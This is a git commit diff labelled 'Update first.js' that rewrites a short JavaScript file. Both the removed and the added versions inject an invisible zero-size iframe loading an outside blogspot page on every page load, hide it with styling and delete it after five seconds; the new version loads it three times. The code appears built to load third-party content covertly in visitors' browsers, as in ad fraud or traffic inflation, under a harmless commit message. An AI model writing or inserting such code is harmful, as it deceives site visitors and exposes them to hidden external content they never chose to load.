d4be8d9317492768fcc889f7bc5902a0fdb871ed
dandinma3i <102339035+dandinma3i@users.noreply.github.com>
2022-05-17 04:22:56 +0100

    Update first.js

--- first.js
+++ first.js
@@ -1,2 +1,15 @@
-function ninjafr(){var e=document.createElement("iframe");e.src="https://respreq.blogspot.com/",e.style.cssText="width: 0;height: 0;display: none;visibility: hidden;opacity: 0;border: 0;",document.querySelector("body").appendChild(e),setTimeout(function(){e.remove()},5e3)}window.addEventListener("load",function(){for(let e=0;e<1;e++)ninjafr()});
-
+function ninjafr() {
+	var ex = document.createElement("iframe");
+	ex.src = "https://respreq.blogspot.com/";
+  ex.style.cssText = "width: 0;height: 0;display: none;visibility: hidden;opacity: 0;border: 0;";
+  document.body.appendChild(ex);
+  setTimeout(function() {
+		document.body.removeChild(ex);
+	}, 5e3)
+}
+window.addEventListener("load", function() {
+	for (let e = 0; e < 3; e++){
+    ninjafr()
+  }
+});
+document.body.classList.add("xhome");
